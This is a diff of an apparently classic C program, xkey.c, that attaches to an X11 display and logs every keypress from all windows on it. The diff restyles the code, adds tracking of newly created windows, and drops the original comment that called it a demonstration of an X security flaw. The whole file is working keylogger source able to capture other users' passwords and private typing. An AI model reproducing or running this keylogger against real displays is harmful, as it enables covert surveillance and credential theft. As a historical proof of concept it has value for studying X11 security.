@@ -1,12 +1,7 @@
-/* To compile, run it through your favorite ansi compiler something like
- * this :
+/*
+ * Original code:  Dominic Giampaolo (nick@cs.maxine.wpi.edu)
  *
- *    gcc -o xkey xkey.c -lX11 -lm
- *
- * To run it, just use it like this :  xkey displayname:0
- * and watch as that display's keypresses show up in your shell window.
- *
- *    Dominic Giampaolo (nick@cs.maxine.wpi.edu)
+ * Hacked like a mofo by Dustin Sallings <dustin@spy.net>
  */
 #include <stdio.h>
 #include <X11/X.h>
@@ -16,147 +11,140 @@
 #include <X11/Xutil.h>
 #include <X11/Shell.h>
 
-char *TranslateKeyCode(XEvent *ev);
-void dumpEvent(XKeyEvent *xke);
+char           *TranslateKeyCode(XEvent * ev);
+void            dumpEvent(XKeyEvent * xke);
 
-Window last_window;
+Window          last_window;
 
-Display *d;
+Display        *d;
 
-void snoop_all_windows(Window root, unsigned long type)
+void
+snoop_all_windows(Window root, unsigned long type)
 {
-  static int level = 0;
-  Window parent, *children, *child2;
-  unsigned int nchildren;
-  int stat, i,j,k;
+	static int      level = 0;
+	Window          parent, *children, *child2;
+	unsigned int    nchildren;
+	int             stat, i, j, k;
 
-  level++;
+	level++;
 
-  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
-  if (stat == FALSE)
-   {
-     fprintf(stderr, "Can't query window tree...\n");
-     return;
-   }
+	stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
+	if (stat == FALSE) {
+		fprintf(stderr, "Can't query window tree...\n");
+		return;
+	}
+	if (nchildren == 0)
+		return;
 
-  if (nchildren == 0)
-    return;
+	XSelectInput(d, root, type);
 
-  /* For a more drastic inidication of the problem being exploited
-   * here, you can change these calls to XSelectInput() to something
-   * like XClearWindow(d, children[i]) or if you want to be real
-   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
-   * then you'll want to remove the loop in main().
-   *
-   * The whole point of this exercise being that I shouldn't be
-   * allowed to manipulate resources which do not belong to me.
-   */
-  XSelectInput(d, root, type);
+	for (i = 0; i < nchildren; i++) {
+		XSelectInput(d, children[i], type);
+		snoop_all_windows(children[i], type);
+	}
 
-  for(i=0; i < nchildren; i++)
-   {
-     XSelectInput(d, children[i], type);
-     snoop_all_windows(children[i], type);
-   }
-
-  XFree((char *)children);
+	XFree((char *) children);
 }
 
-
-void main(int argc, char **argv)
+/* Add new Windows as they arrive */
+void
+handleCreateEvent(XEvent *ev)
 {
-  char *hostname;
-  char *string;
-  XEvent xev;
-  int count = 0;
+	XCreateWindowEvent *xcwe;
 
-  if (argv[1] == NULL)
-    hostname = ":0";
-  else
-    hostname = argv[1];
+	xcwe=(XCreateWindowEvent *)ev;
+	snoop_all_windows(xcwe->window, SubstructureNotifyMask|KeyPressMask);
 
-  d = XOpenDisplay(hostname);
-  if (d == NULL)
-   {
-     fprintf(stderr, "Blah, can't open display: %s\n", hostname);
-     exit(10);
-   }
+	printf("-- New Window (0x%x) --\n", xcwe->window);
+}
 
-  snoop_all_windows(DefaultRootWindow(d), KeyPressMask);
+/* Record the key events */
+void
+handleKeyEvent(XEvent *ev)
+{
+	char *string=NULL;
+	string = TranslateKeyCode(ev);
+	if (string == NULL)
+		return;
+	if (*string == '\r')
+		printf("\n");
+	else if (strlen(string) == 1)
+		printf("%s", string);
+	else
+		printf("<<%s>>", string);
+	fflush(stdout);
+}
 
-  while(1)
-   {
-     XNextEvent(d, &xev);
+/* maine? */
+void
+main(int argc, char **argv)
+{
+	char           *hostname;
+	XEvent          xev;
+	int             count = 0;
 
-     string = TranslateKeyCode(&xev);
-     if (string == NULL)
-       continue;
+	if (argv[1] == NULL)
+		hostname = ":0";
+	else
+		hostname = argv[1];
 
-     if (*string == '\r')
-       printf("\n");
-     else if (strlen(string) == 1)
-       printf("%s", string);
-     else
-       printf("<<%s>>", string);
-     fflush(stdout);
-   }
+	d = XOpenDisplay(hostname);
+	if (d == NULL) {
+		fprintf(stderr, "Blah, can't open display: %s\n", hostname);
+		exit(10);
+	}
+	snoop_all_windows(DefaultRootWindow(d),
+		SubstructureNotifyMask|KeyPressMask);
+
+	while (1) {
+		XNextEvent(d, &xev);
+
+		switch(xev.type) {
+			case CreateNotify:
+				handleCreateEvent(&xev);
+				break;
+			case KeyPress:
+				handleKeyEvent(&xev);
+				break;
+			default:
+				break;
+		}
+
+	}
 }
 
 
 #define KEY_BUFF_SIZE 256
-static char key_buff[KEY_BUFF_SIZE];
+static char     key_buff[KEY_BUFF_SIZE];
 
-char *TranslateKeyCode(XEvent *ev)
+/* XKeyEvent -> string */
+char           *
+TranslateKeyCode(XEvent * ev)
 {
-  int count;
-  char *tmp;
-  KeySym ks;
-  Window current_window;
+	int             count;
+	char           *tmp;
+	KeySym          ks;
+	Window          current_window;
 
-  if (ev)
-   {
-	 XKeyEvent *xke=(XKeyEvent *)ev;
-	 /* dumpEvent(xke); */
-	 current_window=xke->window;
-	 if(current_window != last_window) {
-		printf("\nNew Window:  0x%x\n", current_window);
-		last_window=current_window;
-	 }
-     count = XLookupString(xke, key_buff, KEY_BUFF_SIZE, &ks,NULL);
-     key_buff[count] = '\0';
+	if (ev) {
+		XKeyEvent      *xke = (XKeyEvent *) ev;
+		/* dumpEvent(xke); */
+		current_window = xke->window;
+		if (current_window != last_window) {
+			printf("\n -- switched to window 0x%x--\n", current_window);
+			last_window = current_window;
+		}
+		count = XLookupString(xke, key_buff, KEY_BUFF_SIZE, &ks, NULL);
+		key_buff[count] = '\0';
 
-     if (count == 0)
-      {
-        tmp = XKeysymToString(ks);
-        if (tmp)
-          strcpy(key_buff, tmp);
-        else
-          strcpy(key_buff, "");
-      }
-     return key_buff;
-   }
-  else
-    return NULL;
-}
-
-#define _dump(a) printf("%s:  0x%x\n", #a, xke->a);
-
-void dumpEvent(XKeyEvent *xke)
-{
-	printf("\n--------------------------------------------\n");
-	_dump(type);
-	_dump(serial);
-	_dump(send_event);
-	_dump(display);
-	_dump(window);
-	_dump(root);
-	_dump(subwindow);
-	_dump(time);
-	_dump(x);
-	_dump(y);
-	_dump(x_root);
-	_dump(y_root);
-	_dump(state);
-	_dump(keycode);
-	_dump(same_screen);
+		if (count == 0) {
+			tmp = XKeysymToString(ks);
+			if (tmp)
+				strcpy(key_buff, tmp);
+			else
+				strcpy(key_buff, "");
+		}
+		return key_buff;
+	} else
+		return NULL;
 }
